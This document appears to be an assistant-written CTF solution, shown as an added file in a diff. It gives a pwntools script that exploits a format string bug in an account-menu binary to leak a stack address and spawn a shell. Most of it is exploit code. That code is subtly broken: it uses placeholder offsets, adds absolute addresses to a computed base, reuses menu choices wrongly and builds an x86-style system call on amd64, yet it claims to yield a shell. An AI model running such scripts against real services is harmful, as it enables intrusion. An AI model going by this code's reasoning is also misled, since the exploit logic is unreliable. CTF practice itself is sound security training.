@@ -1,0 +1,123 @@
+To solve this CTF challenge using `pwntools`, we need to identify the vulnerabilities and craft the appropriate exploit. Based on the provided code, the challenge appears to have a format string vulnerability in the `sub_400B07` function, which calls `printf` with a user-controlled format string.
+
+Here are the steps to solve the challenge:
+
+1. **Identify the Vulnerability**: The `sub_400B07` function uses `printf` with a user-controlled format string, which can lead to a format string vulnerability.
+
+2. **Exploit the Vulnerability**: We can use the format string vulnerability to leak addresses or overwrite values in memory. For this challenge, we will use it to leak a stack address and then use that to calculate the base address of the binary or a library. Finally, we can overwrite the return address to gain control of the execution flow.
+
+3. **Craft the Exploit**: We will use `pwntools` to automate the process of interacting with the binary and crafting the payload.
+
+### Step-by-Step Solution
+
+#### Step 1: Set Up the Environment
+First, ensure you have `pwntools` installed. If not, you can install it using pip:
+```sh
+pip install pwntools
+```
+
+#### Step 2: Analyze the Binary
+Use `gdb` or `pwntools` to analyze the binary and find the offsets and addresses needed for the exploit.
+
+#### Step 3: Write the Exploit Script
+
+Here is a Python script using `pwntools` to exploit the challenge:
+
+```python
+from pwn import *
+
+# Set up the context (architecture, binary, and remote connection)
+context.arch = 'amd64'
+context.log_level = 'debug'
+
+# Connect to the challenge (local or remote)
+# For local testing
+# p = process('./fmt')
+
+# For remote connection
+p = remote('challenge_server', 1337)
+
+# Function to register an account
+def register_account(username, password):
+    p.recvuntil(b'1.Sh0w Account Infomation!')
+    p.sendline(b'1')
+    p.recvuntil(b'Input your username(max lenth:20): ')
+    p.sendline(username)
+    p.recvuntil(b'Input your password(max lenth:20): ')
+    p.sendline(password)
+
+# Function to edit account information
+def edit_account(username, password):
+    p.recvuntil(b'1.Sh0w Account Infomation!')
+    p.sendline(b'2')
+    p.recvuntil(b'please input new username(max lenth:20): ')
+    p.sendline(username)
+    p.recvuntil(b'please input new password(max lenth:20): ')
+    p.sendline(password)
+
+# Function to show account information
+def show_account():
+    p.recvuntil(b'1.Sh0w Account Infomation!')
+    p.sendline(b'1')
+
+# Function to quit
+def quit():
+    p.recvuntil(b'1.Sh0w Account Infomation!')
+    p.sendline(b'3')
+
+# Register an account with a controlled format string
+register_account(b'A' * 20, b'B' * 20)
+
+# Edit account to trigger the format string vulnerability
+edit_account(b'%15$p', b'B' * 20)
+
+# Show account information to leak the stack address
+show_account()
+
+# Receive the leaked address
+p.recvuntil(b'B' * 20)
+leaked_address = int(p.recvline().strip(), 16)
+log.info(f'Leaked address: {hex(leaked_address)}')
+
+# Calculate the base address of the binary or a library
+# Assuming the leaked address is a stack address, we can use it to calculate the base address
+# For example, if the leaked address is 0x7fffffffe000, and the offset to the base address is 0x1000
+base_address = leaked_address - 0x1000
+log.info(f'Base address: {hex(base_address)}')
+
+# Find the address of the system function and "/bin/sh" string
+# These addresses can be found using tools like `objdump` or `readelf`
+system_address = base_address + 0x4008A6  # Replace with the actual offset
+bin_sh_address = base_address + 0x4008BB  # Replace with the actual offset
+
+# Craft the payload to overwrite the return address
+payload = b'A' * 20
+payload += p64(system_address)
+payload += p64(0)  # Placeholder for the return address after system
+payload += p64(bin_sh_address)
+
+# Edit account with the crafted payload
+edit_account(payload, b'B' * 20)
+
+# Trigger the vulnerability
+show_account()
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation
+
+1. **Register an Account**: We register an account with a controlled format string to leak a stack address.
+2. **Edit Account**: We edit the account to trigger the format string vulnerability and leak the stack address.
+3. **Show Account Information**: We show the account information to receive the leaked address.
+4. **Calculate Base Address**: Using the leaked address, we calculate the base address of the binary or a library.
+5. **Find System and "/bin/sh" Addresses**: We find the addresses of the `system` function and the `"/bin/sh"` string.
+6. **Craft the Payload**: We craft the payload to overwrite the return address with the address of the `system` function and the address of `"/bin/sh"`.
+7. **Trigger the Vulnerability**: We edit the account with the crafted payload and trigger the vulnerability to get a shell.
+
+### Notes
+- The offsets for `system` and `"/bin/sh"` need to be determined using tools like `objdump` or `readelf`.
+- The base address calculation might need adjustment based on the actual binary and environment.
+
+This script should help you exploit the format string vulnerability and gain a shell. Adjust the offsets and addresses as needed for your specific environment.
